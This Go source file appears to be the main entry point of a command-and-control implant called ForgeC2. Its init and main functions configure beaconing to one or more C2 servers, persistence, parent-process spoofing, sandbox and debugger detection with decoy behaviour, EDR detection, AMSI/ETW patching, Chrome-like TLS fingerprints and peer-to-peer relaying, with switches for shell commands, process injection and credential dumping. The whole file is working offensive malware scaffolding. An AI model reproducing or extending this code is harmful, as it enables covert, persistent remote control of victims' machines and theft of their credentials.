package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	mathRand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func init() {
	setDPIAware()
	if InitSleepMask() {
		sleepMaskActive = true
	}

	// Start EDR monitor on init
	startEdrMonitor()

	// Run sandbox detection
	go func() {
		time.Sleep(5 * time.Second) // wait for system to settle
		runSandboxCheck()
	}()

	// Environment classification (async to avoid delaying startup)
	go func() {
		time.Sleep(3 * time.Second)
		envClass, opsProfile := detectEnvironment()
		if opsProfile != nil {
			currentEnvClass = envClass
			currentOpsProfile = opsProfile
			envDetected = true
			if !opsProfile.AllowShell {
				logDebug("[env] Shell commands disabled in this environment")
			}
			if !opsProfile.AllowInjection {
				logDebug("[env] Process injection disabled in this environment")
			}
			if !opsProfile.AllowCredDump {
				logDebug("[env] Credential dumping disabled in this environment")
			}
		}
	}()

	// Apply the injected runtime config block (XOR'd JSON blob) over defaults
	// before any of the string vars are parsed below.
	loadConfigBlob()

	// Re-apply a previously delivered network config (config-over-wire) so the
	// agent starts with the operator's last-known config before re-registering.
	loadPersistedNetworkConfig()

	// Anti-sandbox startup delay: per-boot random sleep inside the configured
	// window before any beacon or task runs. 0/0 (default) disables.
	applyStartDelay()

	// Parse injected string values ( -X only supports string )
	// Multi-C2 failover: comma-separated URLs in C2URL
	parts := strings.Split(C2URL, ",")
	urls := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			urls = append(urls, p)
		}
	}
	if len(urls) == 0 {
		urls = []string{C2URL}
	}
	c2URLsStore(urls, 0)
	var err error
	Interval, err = strconv.Atoi(IntervalStr)
	if err != nil || Interval < 1 {
		Interval = 10
	}
	Jitter, err = strconv.Atoi(JitterStr)
	if err != nil {
		Jitter = 20
	}
	// Clamp jitter to [0,100]% so a >100 value can never yield a negative
	// sleep duration (which would panic time.NewTimer or cause a beacon storm).
	if Jitter < 0 {
		Jitter = 0
	}
	if Jitter > 100 {
		Jitter = 100
	}
	Persist = strings.ToLower(PersistStr) == "true" || PersistStr == "1"
	SkipTLSVerify = strings.ToLower(SkipTLSVerifyStr) == "true" || SkipTLSVerifyStr == "1"
	Debug = strings.ToLower(DebugStr) == "true" || DebugStr == "1"
	BeaconURI = BeaconURIStr
	if BeaconURI == "" {
		BeaconURI = "/api/v1/beacon"
	}
	BeaconMethod = "POST" // FORCE POST �?GET with body is unreliable in Go's http client
	bt := BeaconTransportStr
	if bt == "" {
		bt = "http"
	}
	setBeaconTransport(bt)

	// SMB pipe name: use explicit config or extract from C2URL
	smbPipeName = SMBPipeName
	if smbPipeName == "" {
		// Try to extract from C2URL when Protocol is "smb"
		if getProtocol() == "smb" || strings.HasPrefix(C2URL, "smb://") {
			smbPipeName = strings.TrimPrefix(C2URL, "smb://")
		}
	}
	isSMBParent = strings.ToLower(IsSMBParentStr) == "true" || IsSMBParentStr == "1"

	if Debug {
		fmt.Printf("[DEBUG] BeaconURI=%q BeaconMethod=%q C2URL=%q SMBPipeName=%q\n", BeaconURI, BeaconMethod, C2URL, smbPipeName)
	}
	if id, err := strconv.ParseUint(ListenerIDStr, 10, 32); err == nil {
		ListenerID = uint(id)
	}

	evasionEnabled = strings.ToLower(EvasionStr) == "true" || EvasionStr == "1"
	if v := os.Getenv("FORGEC2_EVASION"); v == "1" || strings.ToLower(v) == "true" {
		evasionEnabled = true
	}

	ghostModeEnabled = strings.ToLower(GhostModeStr) == "true" || GhostModeStr == "1"
	if v := os.Getenv("FORGEC2_GHOST_MODE"); v == "1" || strings.ToLower(v) == "true" {
		ghostModeEnabled = true
	}

	// Adaptive EDR detection: detect running EDR and apply optimal evasion strategy
	edrInfo := DetectEDR()
	strategy := edrInfo.GetStrategy()
	ApplyStrategy(strategy)
	if edrInfo.Detected && Debug {
		fmt.Printf("[EDR] Detected %s, applied strategy\n", edrInfo.Name)
	}

	// Anti-debug detection: early check before beaconing starts
	if runtime.GOOS == "windows" {
		score, details := AntiDebugCheck()
		antiDebugScore = score
		if score > 20 {
			antiDebugTriggered = true
			logDebugf("[antidebug] Detection score: %d/%d checks triggered", score, len(details))
			if score > 50 {
				enterGhostMode("anti-debug threshold exceeded")
			} else {
				patchAMSI = false
				patchETW = false
			}
		}
		go runAntiDebugMonitor()
	}

	ppidSpoofEnabled = strings.ToLower(PPIDSpoofStr) == "true" || PPIDSpoofStr == "1"
	if v := os.Getenv("FORGEC2_PPID_SPOOF"); v == "1" || strings.ToLower(v) == "true" {
		ppidSpoofEnabled = true
	}
	if ppidSpoofEnabled {
		ppidSpoofParent = PPIDSpoofParent
		if v := os.Getenv("FORGEC2_PPID_PARENT"); v != "" {
			ppidSpoofParent = v
		}
		if ppidSpoofParent == "" {
			ppidSpoofParent = "explorer.exe"
		}
	}

	egressDetection = strings.ToLower(EgressDetectionStr) == "true" || EgressDetectionStr == "1"

	chameleonEnabled = strings.ToLower(ChameleonStr) == "true" || ChameleonStr == "1"
	chameleonProfile = ChameleonProfileStr
	if chameleonProfile == "" {
		chameleonProfile = "random"
	}

	persistencePrefix = PersistencePrefixStr
	if persistencePrefix == "" {
		persistencePrefix = "ForgeC2"
	}
	if v := os.Getenv("FORGEC2_PERSIST_PREFIX"); v != "" {
		persistencePrefix = v
	}

	// Derive transport artifact names from the (operator-controlled) persistence
	// prefix so the compiled implant never ships the literal "forgec2" as a pipe
	// name or SSH username — those are trivial network/process IOCs.
	if SMBPipeName == "" {
		SMBPipeName = persistencePrefix
	}
	if SSHUserStr == "" {
		SSHUserStr = persistencePrefix
	}

	// Certificate pinning
	initTLSPinning()

	// SSH transport config
	initSSHConfig()

	// mTLS transport config
	initMTLS()

	// Initialize CLR (.NET) hosting for in-process assembly execution
	if runtime.GOOS == "windows" {
		useCLRHosting = initCLRHosting()
	}

	// Initialize v2 beacon crypto: persistent identity key + ephemeral ECDH session.
	// v2 has no legacy XOR/plaintext beacon path — encryption is mandatory.
	loadOrCreateIdentityKey()
	sess, err := newECDSession()
	if err == nil {
		ecdhSess = sess
	}

	// Expiry date check: exit if expired
	if ExpiryDateStr != "" {
		kd, err := time.Parse("2006-01-02", ExpiryDateStr)
		if err == nil && time.Now().After(kd) {
			debugLog("Expiry date reached, exiting.")
			os.Exit(0)
		}
	}

	// Parse multi-C2 mode
	switch strings.ToLower(C2ModeStr) {
	case "failover":
		c2Mode = C2ModeFailover
	case "roundrobin", "round_robin":
		c2Mode = C2ModeRoundRobin
	case "random":
		c2Mode = C2ModeRandom
	case "split":
		c2Mode = C2ModeSplit
	case "parallel":
		c2Mode = C2ModeParallel
	default:
		c2Mode = C2ModeSingle
	}

	if mr, err := strconv.Atoi(MaxRetriesStr); err == nil {
		maxRetries = mr
	} else {
		maxRetries = 10
	}

	if dt, err := strconv.Atoi(DeadTimeoutStr); err == nil {
		deadTimeout = time.Duration(dt) * time.Second
	} else {
		deadTimeout = 3600 * time.Second
	}

	c2Stats = make(map[int]*c2FailStats)

	// Parse gossip config
	GossipEnabled = strings.ToLower(GossipEnabledStr) == "true" || GossipEnabledStr == "1"
	if gi, err := strconv.Atoi(GossipIntervalStr); err == nil && gi > 0 {
		GossipInterval = gi
	} else {
		GossipInterval = 30
	}
	// If gossip listen addr not set, derive from P2PListenAddr by incrementing port
	if GossipEnabled && GossipListenAddr == "" && P2PListenAddr != "" {
		if host, portStr, err := net.SplitHostPort(P2PListenAddr); err == nil {
			if port, err := strconv.Atoi(portStr); err == nil {
				GossipListenAddr = fmt.Sprintf("%s:%d", host, port+1)
			}
		}
	}

	// Working hours
	setWorkingHours(WorkingStartStr, WorkingEndStr, WorkingTZStr)

	// Kill date
	if KillDateStr != "" {
		if kd, err := time.Parse("2006-01-02", KillDateStr); err == nil {
			killDateParsed = kd
		}
	}

	// All HTTPS egress uses the utls dialer so the ClientHello is a realistic,
	// configurable fingerprint (Chrome Auto by default; the chameleon build
	// rotates it) instead of the Go-stdlib stack.
	tr := newUTLSTransport()
	if ProxyStr != "" {
		proxyURL, err := url.Parse(ProxyStr)
		if err == nil {
			tr.Proxy = http.ProxyURL(proxyURL)
		}
	}
	client = &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func verifySelfIntegrity() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exePath, err = filepath.EvalSymlinks(exePath)
	if err != nil {
		return
	}
	data, err := os.ReadFile(exePath)
	if err != nil {
		return
	}
	// The expected hash is of the binary EXCLUDING the embedded self-hash
	// string itself (which the builder patches in after hashing). Locate the
	// embedded hash region, zero it, and hash the rest so a tampered binary
	// (any change outside that region) fails verification.
	calc := make([]byte, len(data))
	copy(calc, data)
	needle := []byte(SelfCheckSHA256Str)
	if idx := bytes.Index(calc, needle); idx >= 0 {
		for i := idx; i < idx+len(needle) && i < len(calc); i++ {
			calc[i] = 0
		}
	}
	h := sha256.Sum256(calc)
	actual := hex.EncodeToString(h[:])
	if actual != SelfCheckSHA256Str {
		os.Exit(1)
	}
}

func main() {
	log.SetFlags(0)
	if !Debug {
		log.SetOutput(io.Discard)
		os.Stdout, _ = os.Open(os.DevNull)
		os.Stderr, _ = os.Open(os.DevNull)
	}

	if SelfCheckSHA256Str != "" {
		verifySelfIntegrity()
	}

	setDPIAware()
	if Debug {
		fmt.Println(s(SForgeC2), "Agent starting...")
	}

	if Persist {
		addPersistence()
	}

	// Sandbox detection ? run once at startup
	detector := NewSandboxDetector()
	result := detector.Detect()
	inSandbox = result.IsSandbox
	if inSandbox {
		logDebugf("Sandbox detected (confidence: %d%%), entering benign mode", result.Confidence)
	}

	// Initial registration / first beacon
	agentUUID = registerOrGetUUID()

	// Protocol state: registration key. v3 uses a per-implant secret compiled
	// into this binary (never the fleet master key); v2 derives from the
	// compiled-in beacon key. Never transmitted; persisted sequence +
	// registered marker so a restart continues the same session timeline.
	agentRegKey = loadAgentRegKey()
	loadBeaconState()

	// Mark as SMB child if using SMB transport
	if getProtocol() == "smb" || getBeaconTransport() == "smb" {
		isSMBChild = true
		if Debug {
			fmt.Printf(s(SForgeC2)+" SMB child mode, pipe: %s\n", smbPipeName)
		}
	}

	// Start SMB parent pipe listener if configured
	if isSMBParent && smbPipeName != "" {
		if err := StartSMBParentPipe(smbPipeName); err != nil {
			if Debug {
				fmt.Printf("[!] SMB parent pipe start failed: %v\n", err)
			}
		} else {
			go p2pCleanupStaleChildren()
		}
	}

	// Start P2P parent listener if in parent mode
	if P2PMode != "" && P2PListenAddr != "" {
		go p2pParentListen()
		go p2pCleanupStaleChildren()
		if Debug {
			fmt.Printf(s(SForgeC2)+" P2P parent mode (%s) on %s\n", P2PMode, P2PListenAddr)
		}
	}

	// JIT Beacon Scheduler
	if runtime.GOOS == "windows" {
		getBeaconScheduler()
	}

	// Start gossip protocol for P2P mesh auto-routing
	if GossipEnabled {
		go startGossipProtocol()
		if GossipListenAddr != "" {
			go gossipListen()
			if Debug {
				fmt.Printf(s(SForgeC2)+" Gossip listener on %s\n", GossipListenAddr)
			}
		}
	}

	// Run egress detection on first startup if configured
	if getProtocol() != "smb" && (getBeaconTransport() == "auto" || egressDetection) {
		c2Host := extractC2Host()
		ports := parseEgressPorts()
		if Debug {
			fmt.Printf("[egress] Running egress detection against %s ports %v\n", c2Host, ports)
		}
		report := runEgressDetection(c2Host, ports)
		egressReport = report
		egressDetected = true
		if report.Best != "" {
			bestEgressProto = report.Best
			if Debug {
				fmt.Printf("[egress] Best protocol: %s\n", bestEgressProto)
			}
			switch {
			case strings.HasPrefix(bestEgressProto, "tcp/"):
				setProtocol("tcp")
			case bestEgressProto == "dns":
				setProtocol("dns")
			case bestEgressProto == "icmp":
				setProtocol("icmp")
			}
		}
	}

	// Main beacon loop
	startTaskWorker()
	beaconCount := 0
	for {
		// Kill date check: exit if expired
		if !killDateParsed.IsZero() && time.Now().After(killDateParsed) {
			if Debug {
				fmt.Println("[*] Kill date reached, exiting.")
			}
			os.Exit(0)
		}

		// Ghost mode: send final beacon, then hide. Sleep in one-hour slices
		// so an operator-triggered ghost exit (or the auto-expiry timer) is
		// observed promptly instead of up to 24h later.
		if isInGhostMode() {
			if !ghostBeaconSent {
				ghostBeaconSent = true
				doBeaconSafe()
			}
			for i := 0; i < 24 && isInGhostMode(); i++ {
				time.Sleep(1 * time.Hour)
			}
			continue
		}

		// Check triggers before beacon (Windows only)
		if runtime.GOOS == "windows" && beaconSched != nil {
			beaconSched.CheckTriggers()
		}

		doBeaconSafe()
		beaconCount++

		// Exponential backoff on consecutive beacon failures
		if beaconConsecutiveFailures > 0 {
			backoffSec := beaconBackoffSec(beaconConsecutiveFailures)
			// Add jitter: ±25%
			jitterRange := backoffSec / 4
			if jitterRange > 0 {
				backoffSec += int(mathRand.Int31n(int32(2*jitterRange+1))) - jitterRange
			}
			if Debug {
				fmt.Printf("[!] Beacon backoff: sleeping %ds (failures=%d)\n", backoffSec, beaconConsecutiveFailures)
			}
			time.Sleep(time.Duration(backoffSec) * time.Second)
			continue
		}

		// Notify scheduler after beacon
		if runtime.GOOS == "windows" && beaconSched != nil {
			beaconSched.AfterBeacon()
		}

		// Deliver task results immediately instead of waiting a full sleep cycle.
		pendingMu.Lock()
		hasPending := len(pendingResults) > 0 || len(pendingTaskAcks) > 0
		pendingMu.Unlock()
		if hasPending {
			continue
		}

		// Working hours check: if outside working hours, sleep until next window
		wh := getWorkingHours()
		if wh.start != "" && wh.end != "" {
			if !isWithinWorkingHours() {
				sleepDuration := timeUntilNextWindow()
				if Debug {
					fmt.Printf("[working] Outside working hours (%s-%s), sleeping %v\n", wh.start, wh.end, sleepDuration)
				}
				if sleepDuration < 0 {
					sleepDuration = 0
				}
				time.Sleep(sleepDuration)
				continue
			}
		}

		sleepWithJitter()
	}
}
